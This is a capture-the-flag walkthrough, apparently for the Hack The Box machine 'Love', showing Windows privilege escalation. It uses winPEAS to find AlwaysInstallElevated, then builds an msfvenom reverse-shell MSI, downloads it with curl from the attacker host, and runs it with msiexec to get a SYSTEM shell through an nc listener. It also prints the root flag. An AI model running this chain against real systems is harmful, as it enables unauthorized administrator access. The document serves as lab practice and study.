# Enumeration-

Win peas to the rescue-

```bash
C:\Users\Phoebe\Desktop>winpeas.exe                                                                                                                           
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTermi
nalLevel /t REG_DWORD /d 1' and then start a new CMD                                                                                                          
                                                                                                                                                              
             *((,.,/((((((((((((((((((((/,  */                                                                                                                
      ,/*,..*((((((((((((((((((((((((((((((((((,                                                                                                              
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*                                                                                                           
    ((((((((((((((((**********/########## .(* ,(((((((                                                                                                        
    (((((((((((/********************/####### .(. (((((((                                                                                                      
    ((((((..******************/@@@@@/***/###### ./(((((((                                                                                                     
    ,,....********************@@@@@@@@@@(***,#### .//((((((                                                                                                   
    , ,..********************/@@@@@%@@@@/********##((/ /((((                                                                                                  
    ..((###########*********/%@@@@@@@@@/************,,..((((
    .(##################(/******/@@@@@/***************.. /((
    .(#########################(/**********************..*((
    .(##############################(/*****************.,(((
    .(###################################(/************..(((
    .(#######################################(*********..(((
    .(#######(,.***.,(###################(..***.*******..(((
    .(#######*(#####((##################((######/(*****..(((
    .(###################(/***********(##############(...(((
    .((#####################/*******(################.((((((
    .(((############################################(..((((
    ..(((##########################################(..(((((
    ....((########################################( .(((((
    ......((####################################( .((((((
    (((((((((#################################(../((((((
        (((((((((/##########################(/..((((((
              (((((((((/,.  ,*//////*,. ./(((((((((((((((.
                 (((((((((((((((((((((((((((((/

```

### Found AlwaysInstallElevated-

```bash
[+] Checking AlwaysInstallElevated                                                                                                                          
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated                                                          
    AlwaysInstallElevated set to 1 in HKLM!                                                                                                                   
    AlwaysInstallElevated set to 1 in HKCU! 
```


# Exploit-

Using MsfVenom to create a payload-

```bash
root@napster:~/Documents/HTB/Love# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.4 LPORT=9001 -f msi -o reverse.msi                                
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                                        
[-] No arch selected, selecting arch: x64 from the payload                                                                                                    
No encoder specified, outputting raw payload                                                                                                                  
Payload size: 460 bytes                                                                                                                                       
Final size of msi file: 159744 bytes                                                                                                                          
Saved as: reverse.msi

```

Transferred the payload started the listener and executed the payload to get a root shell-

```bash
C:\Users\Phoebe\Desktop>curl http://10.10.15.4:8000/reverse.msi -o msi.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current 
                                 Dload  Upload   Total   Spent    Left  Speed
100  156k  100  156k    0     0   156k      0  0:00:01  0:00:01 --:--:--   99k

C:\Users\Phoebe\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users\Phoebe\Desktop

07/02/2021  02:59 AM    <DIR>          .
07/02/2021  02:59 AM    <DIR>          ..
07/02/2021  02:59 AM           159,744 msi.exe
07/02/2021  12:39 AM                34 user.txt
07/02/2021  02:38 AM         1,678,336 winpeas.exe
               3 File(s)      1,838,114 bytes
               2 Dir(s)   3,888,889,856 bytes free

C:\Users\Phoebe\Desktop>msiexec /quiet /qn /i setup.msi

C:\Users\Phoebe\Desktop>This installation package could not be opened.  Verify that the package exists and that you can access it, or contact the applicationvendor to verify that this is a valid Windows Installer package.
C:\Users\Phoebe\Desktop>msiexec /quiet /qn /i msi.exe
C:\Users\Phoebe\Desktop>
```

# Shell as Admin & Root.txt-

```bash
root@napster:~/Documents/HTB/Love# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.15.4] from (UNKNOWN) [10.10.10.239] 50953
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users\Administrator\Desktop

04/13/2021  03:20 AM    <DIR>          .
04/13/2021  03:20 AM    <DIR>          ..
07/02/2021  12:39 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,888,857,088 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
6127ae405fa74c6491c79a753c0f4c4b
```



PAWN!!!